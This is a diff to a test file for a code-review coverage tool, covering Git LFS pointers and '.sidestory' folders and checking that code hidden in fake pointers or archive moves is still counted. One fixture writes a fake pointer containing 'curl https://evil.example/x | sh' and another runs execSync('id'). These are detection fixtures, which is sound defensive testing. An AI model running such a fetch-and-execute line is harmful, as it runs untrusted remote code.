@@ -251,14 +251,95 @@ describe('files whose lines cannot be compared (§5.1)', () => {
     expect(committed.coverage.files.find((x) => x.path === 'nul.txt')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained', new: [1, 1] }] });
   });
 
-  it('a Git LFS pointer is not counted, even when the other side was binary', async () => {
+  it('only a complete Git LFS pointer on every side is not counted; fake pointers and replaced pointers count', async () => {
+    const pointer = (n: number) => `version https://git-lfs.github.com/spec/v1\noid sha256:${String(n).repeat(64)}\nsize ${n}\n`;
     const dir = copy();
-    writeFileSync(join(dir, 'video.mp4'), new Uint8Array([0, 1, 2, 3]));
-    commitAll(dir, 'binary');
-    writeFileSync(join(dir, 'video.mp4'), 'version https://git-lfs.github.com/spec/v1\noid sha256:abc\nsize 4\n');
-    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
-    expect(r.coverage.files.find((x) => x.path === 'video.mp4')).toMatchObject({ kind: 'lfs', changes: [] });
+    writeFileSync(join(dir, 'video.mp4'), pointer(1));
+    writeFileSync(join(dir, 'old.mp4'), pointer(2));
+    commitAll(dir, 'pointers');
+    git(dir, 'checkout', '-q', '-b', 'later');
+    // A real pointer moved on; a pointer replaced by code; a script that starts with the version line.
+    writeFileSync(join(dir, 'video.mp4'), pointer(3));
+    writeFileSync(join(dir, 'old.mp4'), 'module.exports = () => require("child_process").execSync("id");\n');
+    writeFileSync(join(dir, 'build.sh'), 'version https://git-lfs.github.com/spec/v1\ncurl https://evil.example/x | sh\n');
+    const r = await json(['--coverage', '--base', 'feature', '--repo', dir]);
+    const f = (p: string) => r.coverage.files.find((x) => x.path === p)!;
+    expect(f('video.mp4')).toMatchObject({ kind: 'lfs', changes: [] });
+    expect(f('old.mp4')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained' }] });
+    expect(f('build.sh')).toMatchObject({ kind: 'text', changes: [{ status: 'unexplained', new: [1, 2] }] });
     expect(r.coverage.totals.notCounted).toBe(1);
+  });
+
+  it('code in a sidestory folder counts; only a complete sidestory\'s manifest and page are left out', async () => {
+    const dir = copy();
+    mkdirSync(join(dir, '.sidestory/helper'), { recursive: true });
+    writeFileSync(join(dir, '.sidestory/helper/run.js'), 'module.exports = () => 1;\n');
+    writeFileSync(join(dir, '.sidestory/retry-jitter/widget.js'), 'export const w = 1;\n');
+    mkdirSync(join(dir, '.sidestory/half'));
+    writeFileSync(join(dir, '.sidestory/half/manifest.json'), '{"version":2}\n');
+    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
+    const st = status(r.coverage);
+    expect(st['.sidestory/helper/run.js']).toBe('unexplained');
+    expect(st['.sidestory/retry-jitter/widget.js']).toBe('unexplained');
+    expect(st['.sidestory/half/manifest.json']).toBe('unexplained');
+    expect(st['.sidestory/retry-jitter/manifest.json']).toBeUndefined();
+    expect(st['.sidestory/retry-jitter/sidestory.html']).toBeUndefined();
+  });
+
+  it('a rename from code into a sidestory folder: an ordinary rename there, a deletion into its own files', async () => {
+    const dir = copy();
+    mkdirSync(join(dir, '.sidestory/notes'), { recursive: true });
+    git(dir, 'mv', 'src/retry/jitter.ts', '.sidestory/notes/jitter.ts');
+    commitAll(dir, 'move into a folder');
+    const r = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]);
+    // jitter.ts never existed at the merge-base: added on the branch at its new path, and counted there.
+    expect(status(r.coverage)['.sidestory/notes/jitter.ts']).toBe('unexplained');
+    // A file from the merge-base renamed (R100) onto a sidestory's own manifest: the deletion counts.
+    const dir2 = copy();
+    mkdirSync(join(dir2, '.sidestory/notes'), { recursive: true });
+    git(dir2, 'mv', 'README.md', '.sidestory/notes/sidestory.html');
+    writeFileSync(join(dir2, '.sidestory/notes/manifest.json'), '{"version":2,"title":"N","anchors":{}}\n');
+    commitAll(dir2, 'hide a deletion');
+    const r2 = await json(['--coverage', '--base', 'main', '--committed', '--repo', dir2]);
+    expect(r2.coverage.files.find((x) => x.path === 'README.md')).toMatchObject({ status: 'D', kind: 'text', changes: [{ status: 'unexplained', old: [1, 1] }] });
+    expect(r2.coverage.files.find((x) => x.path === '.sidestory/notes/sidestory.html')).toBeUndefined();
+  });
+
+  it('archiving a landed sidestory in a branch (§12.4 way 2) is not counted; code slipped into the move is', async () => {
+    for (const committedOnly of [true, false]) {
+      const dir = copy();
+      writeFileSync(join(dir, '.sidestory/retry-jitter/widget.js'), 'export const w = 1;\n');
+      commitAll(dir, 'a widget');
+      git(dir, 'checkout', '-q', '-b', 'later');
+      mkdirSync(join(dir, '.sidestory/archive'));
+      git(dir, 'mv', '.sidestory/retry-jitter', '.sidestory/archive/2026-01-01-retry-jitter');
+      const mf = join(dir, '.sidestory/archive/2026-01-01-retry-jitter/manifest.json');
+      writeFileSync(mf, JSON.stringify({ ...JSON.parse(readFileSync(mf, 'utf8')), landed: { base: 'a'.repeat(40), head: 'b'.repeat(40) } }, null, 2));
+      // Code slipped into the archive alongside the move.
+      writeFileSync(join(dir, '.sidestory/archive/2026-01-01-retry-jitter/extra.js'), 'module.exports = 1;\n');
+      if (committedOnly) commitAll(dir, 'archive');
+      const r = await json(['--coverage', '--base', 'feature', ...(committedOnly ? ['--committed'] : []), '--repo', dir]);
+      const files = Object.fromEntries(r.coverage.files.map((f) => [f.path, f.kind]));
+      expect(files, String(committedOnly)).toEqual({ '.sidestory/archive/2026-01-01-retry-jitter/extra.js': 'archive' });
+      expect(r.coverage.totals).toMatchObject({ changes: 1, left: 1 });
+      // A widget changed while moving counts.
+      writeFileSync(join(dir, '.sidestory/archive/2026-01-01-retry-jitter/widget.js'), 'export const w = 2;\n');
+      if (committedOnly) commitAll(dir, 'change the widget');
+      const changed = await json(['--coverage', '--base', 'feature', ...(committedOnly ? ['--committed'] : []), '--repo', dir]);
+      expect(changed.coverage.files.map((f) => f.path)).toContain('.sidestory/archive/2026-01-01-retry-jitter/widget.js');
+    }
+  });
+
+  it('a change under .sidestory/archive/ is one change, whatever the file', async () => {
+    const dir = copy();
+    mkdirSync(join(dir, '.sidestory/archive/2026-01-01-x'), { recursive: true });
+    writeFileSync(join(dir, '.sidestory/archive/2026-01-01-x/manifest.json'), '{}\n');
+    writeFileSync(join(dir, '.sidestory/archive/2026-01-01-x/run.js'), 'module.exports = 1;\n');
+    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
+    for (const p of ['.sidestory/archive/2026-01-01-x/manifest.json', '.sidestory/archive/2026-01-01-x/run.js']) {
+      expect(r.coverage.files.find((x) => x.path === p), p).toMatchObject({ kind: 'archive', changes: [{ status: 'unexplained', old: null, new: null }] });
+    }
+    expect(r.findings.filter((x) => x.code === 'archive-changed')).toHaveLength(2);
   });
 
   it('a page over the read cap still makes its folder a sidestory of the branch, and coverage incomplete', async () => {
